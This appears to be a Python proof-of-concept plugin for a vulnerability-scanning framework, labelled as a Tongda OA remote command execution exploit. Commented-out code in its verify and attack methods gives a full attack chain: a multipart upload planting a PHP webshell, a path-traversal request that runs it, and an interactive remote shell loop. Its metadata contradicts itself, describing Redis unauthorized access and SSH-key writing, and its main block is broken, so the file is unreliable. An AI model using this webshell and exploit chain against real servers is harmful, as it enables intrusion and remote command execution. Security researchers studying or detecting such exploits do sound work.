#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from newpoc.api import re, requests, PocBase, Output


class POC(PocBase):
    cnvd_cve = 'CNVD-2021-21890'            # 漏洞编号
    version = '1'                           # 默认为1
    author = 'myxae86'                      # PoC 作者名字
    vulDate = '2021-08-28'                  # 漏洞公开的时间
    createDate = '2021-08-28'               # 编写 PoC 的日期
    updateDate = '2021-08-29'               # PoC 更新的时间，默认和编写时间一样
    references = []                         # 漏洞地址来源
    name = '通达OA远程命令执行'               # PoC 名称
    appPowerLink = 'https://redis.io/'      # 漏洞厂商主页地址
    appName = 'Redis'                       # 漏洞应用名称
    appVersion = '<=11.7'                # 漏洞影响版本
    vulType = 'RCE'         # 漏洞类型
    desc = '''
        Redis默认情况下会绑定在0.0.0.0:6379，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
        攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。
        *1
        $4
        info
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['redis']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/Tongda/tongda_rce.py"
    output = Output()

    def _verify(self, url):
        import time
        time.sleep(2)
        # try:
        #     url1 = url + '/ispirit/im/upload.php'
        #     headers = {
        #         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
        #         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        #         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
        #         "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
        #         "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
        #     data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
        #     result = requests.post(url1, headers=headers, data=data, timeout=5)
        #
        #     name = "".join(re.findall("2003_(.+?)\|", result.text))
        #     url2 = url + '/ispirit/interface/gateway.php'
        #     headers = {
        #         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
        #         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        #         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
        #         "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
        #         "Content-Type": "application/x-www-form-urlencoded"}
        #     data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo fffhhh"}
        #     result = requests.post(url2, headers=headers, data=data)
        #     if result.status_code == 200 and 'fffhhh' in result.text:
        #         # print("[+] Remote code execution vulnerability exists at the target address")
        #         return name
        #     else:
        #         return False
        # except:
        #     pass
        self.output.check("tongda_verify:{}".format(id(self.output)))

    def _attack(self, url):  # def _attack(self, url, name, command="whoami"):
        # url = url + '/ispirit/interface/gateway.php'
        # headers = {
        #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
        #     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        #     "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
        #     "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
        #     "Content-Type": "application/x-www-form-urlencoded"}
        # data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
        # result = requests.post(url, headers=headers, data=data)
        # while (1):
        #     command = input("fuhei@shell$ ")
        #     if command == 'exit' or command == 'quit':
        #         break
        #     else:
        #         data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
        #         result = requests.post(url, headers=headers, data=data)
        self.output.error("tongda_attack:{}".format(url))

    def _shell(self, url):
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
        # cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        # 攻击代码 execute cmd
        self.output.error("tongda_shell:{}".format(url))


if __name__ == '__main__':
    url = ""
    a = POC
    name = a.check(url)
    if name:
        print("[+] Remote code execution vulnerability exists at the target address")
        a.command(url, name)
    else:
        print("[-] There is no remote code execution vulnerability in the target address")
